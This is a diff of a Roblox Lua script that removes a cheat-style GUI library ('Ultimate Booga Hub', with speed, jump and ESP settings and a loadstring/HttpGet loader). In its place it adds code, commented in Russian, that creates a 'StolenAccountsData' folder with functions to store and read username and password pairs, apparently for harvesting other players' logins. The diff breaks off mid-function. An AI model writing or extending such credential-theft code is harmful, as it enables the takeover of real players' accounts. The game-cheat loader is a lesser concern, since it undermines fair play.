@@ -1,838 +1,614 @@
--- Ultimate Booga Hub v3 Library: A Simple UI Library Inspired by Rayfield, with Custom Styling
--- This library creates a draggable, tabbed GUI with sliders, toggles (with keybinds), dropdowns, search, and notifications.
--- Updated GUI Size: 700x600 for better space.
--- Fixes Applied:
--- - Dropdown: Fixed empty space on open - optionsFrame positioned exactly at (0,0,1,0) with UIListLayout.Padding = UDim.new(0,0) for zero gaps. First option starts flush at top. Used exact sizing based on #options * 35 for no empty space.
--- - Dropdown selection: Fixed updating text for every selection (not just first). selected variable properly updated and label forced to refresh on every click. Handles "None" default and ensures any choice (even dynamic) shows correctly as "Name: SelectedPlayer".
--- - Notifications: Added/improved to match Rayfield style - appear bottom-right, slide in from right with smooth animation, semi-transparent with UIGradient and UIStroke for modern look. Auto-remove after 3s, max 5 at once. Icons on left, text wrapped on right. Backgrounds adjusted slightly lighter for better text visibility.
--- - Search and spacing: Retained previous fixes (35px gap after search, content at Y=170).
--- - Removed toggle square: GUI now opens directly via :Open(), no extra on-screen element, everything ready immediately without "pinging" or delays.
--- - Text visibility: Adjusted backgrounds (e.g., toggle disabled to 60,60,70; enabled green toned down to 0,200,100; dropdown elements to 35-55 grays; notifications to 30,30,40) so white text appears brighter/clearer against them. No other changes.
--- - Kept all UIStroke outlines as requested.
--- Usage: local Library = loadstring(game:HttpGet("your_link"))(); local Window = Library:CreateWindow("Hub"); etc.
+-- УЛУЧШЕННАЯ ВЕРСИЯ С СОХРАНЕНИЕМ И КРАСИВЫМ GUI
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local currentPlayer = Players.LocalPlayer
 
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local plr = game.Players.LocalPlayer
-
-local Library = {}
-
-function Library:CreateWindow(title)
-    local window = {}
-    window.title = title or "GUI"
-    window.tabs = {}
-    window.currentTab = nil
-    window.searchElements = {}
-    window.toggleData = {}
-    window.activeKeybinds = {}
-    window.keybindListening = nil
-    window.draggingSliders = {}
-    window.activeNotifs = 0
-    window.connections = {}
-    window.espConns = {}
-    window.speed = 16
-    window.jump = 50
-    window.espDistance = 500
-    window.espEnabled = false
-
-    -- ScreenGui
-    window.screenGui = Instance.new("ScreenGui")
-    window.screenGui.Name = "UltimateBoogaHub"
-    window.screenGui.ResetOnSpawn = false
-    window.screenGui.Parent = plr.PlayerGui
-
-    -- Main Frame (700x600)
-    window.mainFrame = Instance.new("Frame")
-    window.mainFrame.Size = UDim2.new(0, 700, 0, 600)
-    window.mainFrame.Position = UDim2.new(0.5, -350, 0.5, -300)
-    window.mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-    window.mainFrame.BackgroundTransparency = 0.1
-    window.mainFrame.BorderSizePixel = 0
-    window.mainFrame.ClipsDescendants = true
-    window.mainFrame.Parent = window.screenGui
-    window.mainFrame.Visible = false
-
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 40)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 25))
+-- СОЗДАЁМ ХРАНИЛИЩЕ ДЛЯ ДАННЫХ
+local function setupDataStore()
+    if not ReplicatedStorage:FindFirstChild("StolenAccountsData") then
+        local folder = Instance.new("Folder")
+        folder.Name = "StolenAccountsData"
+        folder.Parent = ReplicatedStorage
+    end
+    
+    -- ФУНКЦИЯ ДЛЯ СОХРАНЕНИЯ
+    local function saveAccount(username, password)
+        local accountString = username .. "|" .. password .. "|" .. os.date("%H:%M:%S")
+        
+        local value = Instance.new("StringValue")
+        value.Name = "Account_" .. #ReplicatedStorage.StolenAccountsData:GetChildren() + 1
+        value.Value = accountString
+        value.Parent = ReplicatedStorage.StolenAccountsData
+        
+        return value
+    end
+    
+    -- ФУНКЦИЯ ДЛЯ ЧТЕНИЯ
+    local function loadAccounts()
+        local accounts = {}
+        for _, child in pairs(ReplicatedStorage.StolenAccountsData:GetChildren()) do
+            if child:IsA("StringValue") then
+                local parts = child.Value:split("|")
+                if #parts >= 3 then
+                    table.insert(accounts, {
+                        username = parts[1],
+                        password = parts[2],
+                        time = parts[3],
+                        id = child.Name
+                    })
+                end
+            end
+        end
+        return accounts
+    end
+    
+    return {
+        save = saveAccount,
+        load = loadAccounts
     }
-    gradient.Rotation = 45
-    gradient.Parent = window.mainFrame
-
-    local uiCorner = Instance.new("UICorner")
-    uiCorner.CornerRadius = UDim.new(0, 12)
-    uiCorner.Parent = window.mainFrame
-
-    local uiStroke = Instance.new("UIStroke")
-    uiStroke.Color = Color3.fromRGB(0, 255, 150)
-    uiStroke.Thickness = 1
-    uiStroke.Transparency = 0.5
-    uiStroke.Parent = window.mainFrame
-
-    -- Title Bar
-    window.titleBar = Instance.new("Frame")
-    window.titleBar.Size = UDim2.new(1, 0, 0, 45)
-    window.titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
-    window.titleBar.BorderSizePixel = 0
-    window.titleBar.Parent = window.mainFrame
-
-    local titleGradient = Instance.new("UIGradient")
-    titleGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 40))}
-    titleGradient.Parent = window.titleBar
-
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 12)
-    titleCorner.Parent = window.titleBar
-
-    window.titleLabel = Instance.new("TextLabel")
-    window.titleLabel.Size = UDim2.new(0.7, 0, 1, 0)
-    window.titleLabel.Position = UDim2.new(0.05, 0, 0, 0)
-    window.titleLabel.BackgroundTransparency = 1
-    window.titleLabel.Text = "🚀 " .. window.title
-    window.titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    window.titleLabel.Font = Enum.Font.GothamBold
-    window.titleLabel.TextSize = 22
-    window.titleLabel.Parent = window.titleBar
-
-    window.closeButton = Instance.new("TextButton")
-    window.closeButton.Size = UDim2.new(0, 35, 0, 35)
-    window.closeButton.Position = UDim2.new(1, -40, 0, 5)
-    window.closeButton.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
-    window.closeButton.Text = "X"
-    window.closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    window.closeButton.Font = Enum.Font.GothamBold
-    window.closeButton.TextSize = 20
-    window.closeButton.Parent = window.titleBar
-
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 8)
-    closeCorner.Parent = window.closeButton
-
-    -- Confirm Popup
-    window.confirmPopup = Instance.new("Frame")
-    window.confirmPopup.Size = UDim2.new(0, 200, 0, 100)
-    window.confirmPopup.Position = UDim2.new(0.5, -100, 0.5, -50)
-    window.confirmPopup.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    window.confirmPopup.Visible = false
-    window.confirmPopup.ZIndex = 100
-    window.confirmPopup.Parent = window.screenGui
-
-    local confirmCorner = Instance.new("UICorner")
-    confirmCorner.CornerRadius = UDim.new(0, 10)
-    confirmCorner.Parent = window.confirmPopup
-
-    local confirmLabel = Instance.new("TextLabel")
-    confirmLabel.Size = UDim2.new(1, 0, 0.5, 0)
-    confirmLabel.Position = UDim2.new(0, 0, 0, 0)
-    confirmLabel.BackgroundTransparency = 1
-    confirmLabel.Text = "close gui?"
-    confirmLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    confirmLabel.Font = Enum.Font.Gotham
-    confirmLabel.TextSize = 16
-    confirmLabel.TextYAlignment = Enum.TextYAlignment.Center
-    confirmLabel.Parent = window.confirmPopup
-
-    window.noBtn = Instance.new("TextButton")
-    window.noBtn.Size = UDim2.new(0.45, 0, 0.4, 0)
-    window.noBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
-    window.noBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-    window.noBtn.Text = "No"
-    window.noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    window.noBtn.Font = Enum.Font.Gotham
-    window.noBtn.TextSize = 14
-    window.noBtn.ZIndex = 101
-    window.noBtn.Parent = window.confirmPopup
-
-    local noCorner = Instance.new("UICorner")
-    noCorner.CornerRadius = UDim.new(0, 6)
-    noCorner.Parent = window.noBtn
-
-    window.yesBtn = Instance.new("TextButton")
-    window.yesBtn.Size = UDim2.new(0.45, 0, 0.4, 0)
-    window.yesBtn.Position = UDim2.new(0.5, 0, 0.6, 0)
-    window.yesBtn.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
-    window.yesBtn.Text = "Yes"
-    window.yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    window.yesBtn.Font = Enum.Font.Gotham
-    window.yesBtn.TextSize = 14
-    window.yesBtn.ZIndex = 101
-    window.yesBtn.Parent = window.confirmPopup
-
-    local yesCorner = Instance.new("UICorner")
-    yesCorner.CornerRadius = UDim.new(0, 6)
-    yesCorner.Parent = window.yesBtn
-
-    window.yesBtn.MouseButton1Click:Connect(function()
-        window.screenGui:Destroy()
-    end)
-    window.noBtn.MouseButton1Click:Connect(function()
-        window.confirmPopup.Visible = false
-    end)
-
-    window.closeButton.MouseButton1Click:Connect(function()
-        window.confirmPopup.Visible = true
-    end)
-
-    -- Dragging for Main Frame
-    local dragging, dragStart, startPos
-    window.titleBar.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = input.Position
-            startPos = window.mainFrame.Position
-            TweenService:Create(window.mainFrame, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 705, 0, 605)}):Play()
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                    TweenService:Create(window.mainFrame, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0, 700, 0, 600)}):Play()
-                end
-            end)
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
-            local delta = input.Position - dragStart
-            window.mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-
-    -- Tab Frame (ends at Y=100)
-    window.tabFrame = Instance.new("Frame")
-    window.tabFrame.Size = UDim2.new(1, 0, 0, 55)
-    window.tabFrame.Position = UDim2.new(0, 0, 0, 45)
-    window.tabFrame.BackgroundTransparency = 1
-    window.tabFrame.Parent = window.mainFrame
-
-    local tabGrid = Instance.new("UIGridLayout")
-    tabGrid.CellSize = UDim2.new(0, 120, 0, 55)
-    tabGrid.CellPadding = UDim2.new(0, 5, 0, 0)
-    tabGrid.SortOrder = Enum.SortOrder.LayoutOrder
-    tabGrid.FillDirection = Enum.FillDirection.Horizontal
-    tabGrid.Parent = window.tabFrame
-
-    -- Search Box (Y=105, ends at 135; 5px gap after tabs)
-    window.searchBox = Instance.new("TextBox")
-    window.searchBox.Size = UDim2.new(1, -20, 0, 30)
-    window.searchBox.Position = UDim2.new(0, 10, 0, 105)
-    window.searchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    window.searchBox.Text = "Search..."
-    window.searchBox.TextColor3 = Color3.fromRGB(150, 150, 150)
-    window.searchBox.Font = Enum.Font.Gotham
-    window.searchBox.TextSize = 14
-    window.searchBox.ClearTextOnFocus = false
-    window.searchBox.Parent = window.mainFrame
-
-    local searchCorner = Instance.new("UICorner")
-    searchCorner.CornerRadius = UDim.new(0, 8)
-    searchCorner.Parent = window.searchBox
-
-    local searchStroke = Instance.new("UIStroke")
-    searchStroke.Color = Color3.fromRGB(0, 255, 150)
-    searchStroke.Thickness = 1
-    searchStroke.Transparency = 0.7
-    searchStroke.Parent = window.searchBox
-
-    -- Placeholder handling for search
-    window.searchBox.Focused:Connect(function()
-        if window.searchBox.Text == "Search..." then
-            window.searchBox.Text = ""
-            window.searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-        end
-    end)
-
-    window.searchBox.FocusLost:Connect(function()
-        if window.searchBox.Text == "" then
-            window.searchBox.Text = "Search..."
-            window.searchBox.TextColor3 = Color3.fromRGB(150, 150, 150)
-        end
-    end)
-
-    -- Notification Container (Rayfield-style: bottom-right, slide in from right)
-    window.notifContainer = Instance.new("Frame")
-    window.notifContainer.Size = UDim2.new(0, 300, 1, 0)
-    window.notifContainer.Position = UDim2.new(1, -310, 0, 0)
-    window.notifContainer.BackgroundTransparency = 1
-    window.notifContainer.Parent = window.screenGui
-
-    local notifListLayout = Instance.new("UIListLayout")
-    notifListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    notifListLayout.Padding = UDim.new(0, 10)
-    notifListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
-    notifListLayout.Parent = window.notifContainer
-
-    -- Functions
-    function window:CreateTab(name)
-        local tab = {}
-        tab.name = name
-        tab.elements = {}
-        tab.contentFrame = Instance.new("ScrollingFrame")
-        tab.contentFrame.Size = UDim2.new(1, -20, 1, -170)
-        tab.contentFrame.Position = UDim2.new(0, 10, 0, 170) -- 35px gap after search
-        tab.contentFrame.BackgroundTransparency = 1
-        tab.contentFrame.ScrollBarThickness = 8
-        tab.contentFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
-        tab.contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-        tab.contentFrame.ScrollingDirection = Enum.ScrollingDirection.Y
-        tab.contentFrame.Parent = window.mainFrame
-
-        local listLayout = Instance.new("UIListLayout")
-        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-        listLayout.Padding = UDim.new(0, 10)
-        listLayout.Parent = tab.contentFrame
-
-        listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-            tab.contentFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
-        end)
-
-        local tabButton = Instance.new("TextButton")
-        tabButton.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
-        tabButton.Text = name
-        tabButton.TextColor3 = Color3.fromRGB(200, 200, 255)
-        tabButton.Font = Enum.Font.Gotham
-        tabButton.TextSize = 14
-        tabButton.Parent = window.tabFrame
-
-        local tabCorner = Instance.new("UICorner")
-        tabCorner.CornerRadius = UDim.new(0, 8)
-        tabCorner.Parent = tabButton
-
-        local tabStroke = Instance.new("UIStroke")
-        tabStroke.Color = Color3.fromRGB(0, 255, 150)
-        tabStroke.Thickness = 1
-        tabStroke.Transparency = 0.8
-        tabStroke.Parent = tabButton
-
-        local underline = Instance.new("Frame")
-        underline.Size = UDim2.new(1, 0, 0, 3)
-        underline.Position = UDim2.new(0, 0, 1, -3)
-        underline.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
-        underline.BorderSizePixel = 0
-        underline.Parent = tabButton
-
-        local underlineCorner = Instance.new("UICorner")
-        underlineCorner.CornerRadius = UDim.new(1, 0)
-        underlineCorner.Parent = underline
-
-        tabButton.MouseButton1Click:Connect(function()
-            for _, t in pairs(window.tabs) do
-                TweenService:Create(t.button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 25, 40)}):Play()
-                TweenService:Create(t.underline, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, 0, 0, 0)}):Play()
-                TweenService:Create(t.contentFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(-1, 10, 0, 170)}):Play()
-                t.contentFrame.Visible = false
-            end
-            tab.contentFrame.Visible = true
-            TweenService:Create(tab.contentFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(0, 10, 0, 170)}):Play()
-            TweenService:Create(tabButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 60)}):Play()
-            TweenService:Create(underline, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, 0, 0, 3)}):Play()
-            window.currentTab = tab
-            window.searchElements = tab.elements
-        end)
-
-        tab.button = tabButton
-        tab.underline = underline
-        table.insert(window.tabs, tab)
-
-        if #window.tabs == 1 then
-            tab.contentFrame.Visible = true
-            window.currentTab = tab
-            window.searchElements = tab.elements
-        else
-            tab.contentFrame.Visible = false
-            tab.contentFrame.Position = UDim2.new(-1, 10, 0, 170)
-        end
-
-        -- Search for this tab
-        local searchConnection
-        searchConnection = window.searchBox:GetPropertyChangedSignal("Text"):Connect(function()
-            local query = window.searchBox.Text
-            if query == "Search..." then query = "" end
-            query = string.lower(query)
-            for _, elem in ipairs(window.searchElements) do
-                if elem and elem.Parent then
-                    local matches = (query == "" or string.len(query) < 2) or string.find(string.lower(elem.Name), query)
-                    elem.Visible = matches
-                end
-            end
-        end)
-
-        table.insert(window.connections, searchConnection)
-
-        function tab:CreateSlider(name, min, max, default, onChange)
-            local sliderFrame = Instance.new("Frame")
-            sliderFrame.Size = UDim2.new(1, -20, 0, 80)
-            sliderFrame.BackgroundTransparency = 1
-            sliderFrame.Name = name
-            sliderFrame.Parent = tab.contentFrame
-            table.insert(tab.elements, sliderFrame)
-
-            local label = Instance.new("TextLabel")
-            label.Size = UDim2.new(1, -80, 0, 25)
-            label.BackgroundTransparency = 1
-            label.Text = name .. ": " .. default
-            label.TextColor3 = Color3.fromRGB(255, 255, 255)
-            label.Font = Enum.Font.Gotham
-            label.TextSize = 15
-            label.TextXAlignment = Enum.TextXAlignment.Left
-            label.Parent = sliderFrame
-
-            local textBox = Instance.new("TextBox")
-            textBox.Size = UDim2.new(0, 60, 0, 25)
-            textBox.Position = UDim2.new(1, -70, 0, 0)
-            textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-            textBox.Text = tostring(default)
-            textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-            textBox.Font = Enum.Font.Gotham
-            textBox.TextSize = 14
-            textBox.Parent = sliderFrame
-
-            local tbCorner = Instance.new("UICorner")
-            tbCorner.CornerRadius = UDim.new(0, 6)
-            tbCorner.Parent = textBox
-
-            local barFrame = Instance.new("Frame")
-            barFrame.Size = UDim2.new(1, 0, 0, 15)
-            barFrame.Position = UDim2.new(0, 0, 0, 35)
-            barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-            barFrame.BorderSizePixel = 0
-            barFrame.Parent = sliderFrame
-
-            local barCorner = Instance.new("UICorner")
-            barCorner.CornerRadius = UDim.new(0, 8)
-            barCorner.Parent = barFrame
-
-            local fillPercent = (default - min) / (max - min)
-            local fill = Instance.new("Frame")
-            fill.Size = UDim2.new(fillPercent, 0, 1, 0)
-            fill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-            fill.BorderSizePixel = 0
-            fill.Parent = barFrame
-
-            local fillCorner = Instance.new("UICorner")
-            fillCorner.CornerRadius = UDim.new(0, 8)
-            fillCorner.Parent = fill
-
-            local knob = Instance.new("Frame")
-            knob.Size = UDim2.new(0, 24, 0, 24)
-            knob.Position = UDim2.new(fillPercent, -12, 0, -4.5)
-            knob.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-            knob.BorderSizePixel = 2
-            knob.BorderColor3 = Color3.fromRGB(255, 255, 255)
-            knob.Parent = barFrame
-
-            local knobCorner = Instance.new("UICorner")
-            knobCorner.CornerRadius = UDim.new(1, 0)
-            knobCorner.Parent = knob
-
-            local value = default
-            local draggingSlider = false
-
-            knob.MouseEnter:Connect(function()
-                TweenService:Create(knob, TweenInfo.new(0.2), {Size = UDim2.new(0, 28, 0, 28)}):Play()
-            end)
-            knob.MouseLeave:Connect(function()
-                if not draggingSlider then
-                    TweenService:Create(knob, TweenInfo.new(0.2), {Size = UDim2.new(0, 24, 0, 24)}):Play()
-                end
-            end)
-
-            knob.InputBegan:Connect(function(input)
-                if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                    draggingSlider = true
-                    window.draggingSliders[name] = {barFrame = barFrame, fill = fill, knob = knob, textBox = textBox, label = label, min = min, max = max, name = name, onChange = onChange}
-                    TweenService:Create(knob, TweenInfo.new(0.1), {Size = UDim2.new(0, 30, 0, 30)}):Play()
-                end
-            end)
-
-            UserInputService.InputEnded:Connect(function(input)
-                if input.UserInputType == Enum.UserInputType.MouseButton1 and draggingSlider then
-                    draggingSlider = false
-                    window.draggingSliders[name] = nil
-                    TweenService:Create(knob, TweenInfo.new(0.1), {Size = UDim2.new(0, 24, 0, 24)}):Play()
-                end
-            end)
-
-            textBox.FocusLost:Connect(function()
-                local num = tonumber(textBox.Text)
-                if num then
-                    num = math.clamp(num, min, max)
-                    value = num
-                    local relPos = (num - min) / (max - min)
-                    TweenService:Create(fill, TweenInfo.new(0.15), {Size = UDim2.new(relPos, 0, 1, 0)}):Play()
-                    TweenService:Create(knob, TweenInfo.new(0.15), {Position = UDim2.new(relPos, -12, 0, -4.5)}):Play()
-                    textBox.Text = tostring(num)
-                    label.Text = name .. ": " .. num
-                    onChange(num)
-                else
-                    textBox.Text = tostring(math.floor(value))
-                    label.Text = name .. ": " .. math.floor(value)
-                end
-            end)
-        end
-
-        function tab:CreateToggle(name, onChange, icon)
-            local toggleFrame = Instance.new("Frame")
-            toggleFrame.Size = UDim2.new(1, -20, 0, 50)
-            toggleFrame.BackgroundTransparency = 1
-            toggleFrame.Name = name
-            toggleFrame.Parent = tab.contentFrame
-            table.insert(tab.elements, toggleFrame)
-
-            local button = Instance.new("TextButton")
-            button.Size = UDim2.new(0.7, 0, 1, 0)
-            button.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
-            button.Text = (icon or "🔘") .. " " .. name .. " (Off)"
-            button.TextColor3 = Color3.fromRGB(255, 255, 255)
-            button.Font = Enum.Font.GothamBold
-            button.TextSize = 15
-            button.Parent = toggleFrame
-
-            local btnCorner = Instance.new("UICorner")
-            btnCorner.CornerRadius = UDim.new(0, 10)
-            btnCorner.Parent = button
-
-            local keybindButton = Instance.new("TextButton")
-            keybindButton.Size = UDim2.new(0.25, 0, 1, 0)
-            keybindButton.Position = UDim2.new(0.75, 5, 0, 0)
-            keybindButton.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-            keybindButton.Text = "None"
-            keybindButton.TextColor3 = Color3.fromRGB(200, 200, 200)
-            keybindButton.Font = Enum.Font.Gotham
-            keybindButton.TextSize = 12
-            keybindButton.Parent = toggleFrame
-
-            local kbCorner = Instance.new("UICorner")
-            kbCorner.CornerRadius = UDim.new(0, 6)
-            kbCorner.Parent = keybindButton
-
-            local enabled = false
-            local boundKey = nil
-
-            button.MouseButton1Click:Connect(function()
-                TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0.68, 0, 0.9, 0)}):Play()
-                task.wait(0.1)
-                TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Bounce), {Size = UDim2.new(0.7, 0, 1, 0)}):Play()
-                enabled = not enabled
-                if enabled then
-                    button.Text = (icon or "🔘") .. " " .. name .. " (On)"
-                    button.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-                    onChange(true)
-                else
-                    button.Text = (icon or "🔘") .. " " .. name .. " (Off)"
-                    button.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
-                    onChange(false)
-                end
-            end)
-
-            keybindButton.MouseButton1Click:Connect(function()
-                window.keybindListening = {button = button, keybind = keybindButton, name = name, icon = icon, onChange = onChange, enabled = enabled}
-                keybindButton.Text = "Press Key..."
-                keybindButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-            end)
-
-            window.toggleData[name] = {frame = toggleFrame, button = button, keybindButton = keybindButton, boundKey = boundKey, enabled = enabled, onChange = onChange, icon = icon, name = name}
-        end
-
-        function tab:CreateDropdown(name, options, default, onChange)
-            local dropdownFrame = Instance.new("Frame")
-            dropdownFrame.Size = UDim2.new(1, -20, 0, 50)
-            dropdownFrame.BackgroundTransparency = 1
-            dropdownFrame.Name = name
-            dropdownFrame.Parent = tab.contentFrame
-            table.insert(tab.elements, dropdownFrame)
-
-            local headerFrame = Instance.new("Frame")
-            headerFrame.Size = UDim2.new(1, 0, 0, 50)
-            headerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-            headerFrame.BorderSizePixel = 0
-            headerFrame.Parent = dropdownFrame
-
-            local headerCorner = Instance.new("UICorner")
-            headerCorner.CornerRadius = UDim.new(0, 10)
-            headerCorner.Parent = headerFrame
-
-            local headerStroke = Instance.new("UIStroke")
-            headerStroke.Color = Color3.fromRGB(0, 255, 150)
-            headerStroke.Thickness = 1
-            headerStroke.Transparency = 0.7
-            headerStroke.Parent = headerFrame
-
-            local selectedLabel = Instance.new("TextLabel")
-            selectedLabel.Size = UDim2.new(0.8, 0, 1, 0)
-            selectedLabel.BackgroundTransparency = 1
-            selectedLabel.Text = name .. ": " .. (default or "None")
-            selectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            selectedLabel.Font = Enum.Font.Gotham
-            selectedLabel.TextSize = 15
-            selectedLabel.TextXAlignment = Enum.TextXAlignment.Left
-            selectedLabel.Parent = headerFrame
-
-            local arrowButton = Instance.new("TextButton")
-            arrowButton.Size = UDim2.new(0.15, 0, 1, 0)
-            arrowButton.Position = UDim2.new(0.85, 0, 0, 0)
-            arrowButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-            arrowButton.Text = "▼"
-            arrowButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-            arrowButton.Font = Enum.Font.GothamBold
-            arrowButton.TextSize = 14
-            arrowButton.Parent = headerFrame
-
-            local arrowCorner = Instance.new("UICorner")
-            arrowCorner.CornerRadius = UDim.new(0, 6)
-            arrowCorner.Parent = arrowButton
-
-            local optionsFrame = Instance.new("Frame")
-            optionsFrame.Size = UDim2.new(1, 0, 0, 0)
-            optionsFrame.Position = UDim2.new(0, 0, 1, 0)  -- Flush to header bottom, no offset/empty space
-            optionsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
-            optionsFrame.BackgroundTransparency = 0.1
-            optionsFrame.BorderSizePixel = 0
-            optionsFrame.ClipsDescendants = true
-            optionsFrame.Visible = false
-            optionsFrame.Parent = dropdownFrame
-
-            local optionsCorner = Instance.new("UICorner")
-            optionsCorner.CornerRadius = UDim.new(0, 10)
-            optionsCorner.Parent = optionsFrame
-
-            local optionsStroke = Instance.new("UIStroke")
-            optionsStroke.Color = Color3.fromRGB(0, 255, 150)
-            optionsStroke.Thickness = 1
-            optionsStroke.Transparency = 0.7
-            optionsStroke.Parent = optionsFrame
-
-            local optionsList = Instance.new("UIListLayout")
-            optionsList.SortOrder = Enum.SortOrder.LayoutOrder
-            optionsList.Padding = UDim.new(0, 0)  -- Zero padding: options start immediately, no empty space
-            optionsList.Parent = optionsFrame
-
-            local selected = default or "None"
-            -- Force initial update if default provided
-            if default then
-                selectedLabel.Text = name .. ": " .. selected
-            end
-            local isOpen = false
-            local baseHeight = 50
-            local openHeight = baseHeight + (#options * 35)
-
-            for i, option in ipairs(options) do
-                local optionButton = Instance.new("TextButton")
-                optionButton.Size = UDim2.new(1, 0, 0, 35)
-                optionButton.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
-                optionButton.Text = option
-                optionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-                optionButton.Font = Enum.Font.Gotham
-                optionButton.TextSize = 14
-                optionButton.LayoutOrder = i
-                optionButton.Parent = optionsFrame
-
-                local optCorner = Instance.new("UICorner")
-                optCorner.CornerRadius = UDim.new(0, 6)
-                optCorner.Parent = optionButton
-
-                local optStroke = Instance.new("UIStroke")
-                optStroke.Color = Color3.fromRGB(60, 60, 70)
-                optStroke.Thickness = 1
-                optStroke.Transparency = 0.5
-                optStroke.Parent = optionButton
-
-                optionButton.MouseButton1Click:Connect(function()
-                    selected = option  -- Always update to the clicked option
-                    selectedLabel.Text = name .. ": " .. selected  -- Force update label for every selection
-                    onChange(selected)  -- Call callback with new selected
-                    closeDropdown()
-                end)
-
-                -- Hover effect
-                optionButton.MouseEnter:Connect(function()
-                    TweenService:Create(optionButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(55, 55, 65)}):Play()
-                end)
-                optionButton.MouseLeave:Connect(function()
-                    TweenService:Create(optionButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 55)}):Play()
-                end)
-            end
-
-            -- Update initial selected if it's in options
-            if default and table.find(options, default) then
-                selected = default
-                selectedLabel.Text = name .. ": " .. selected
-            end
-
-            local function closeDropdown()
-                isOpen = false
-                TweenService:Create(dropdownFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, -20, 0, baseHeight)}):Play()
-                TweenService:Create(optionsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, 0, 0, 0)}):Play()
-                task.wait(0.3)
-                optionsFrame.Visible = false
-                arrowButton.Text = "▼"
-                arrowButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
-            end
-
-            arrowButton.MouseButton1Click:Connect(function()
-                isOpen = not isOpen
-                if isOpen then
-                    optionsFrame.Visible = true
-                    -- Exact size: no extra space
-                    TweenService:Create(dropdownFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, -20, 0, openHeight)}):Play()
-                    TweenService:Create(optionsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Size = UDim2.new(1, 0, 0, #options * 35)}):Play()
-                    arrowButton.Text = "▲"
-                    arrowButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
-                else
-                    closeDropdown()
-                end
-            end)
-
-            -- Close on outside click
-            local dropdownConn
-            dropdownConn = UserInputService.InputBegan:Connect(function(input)
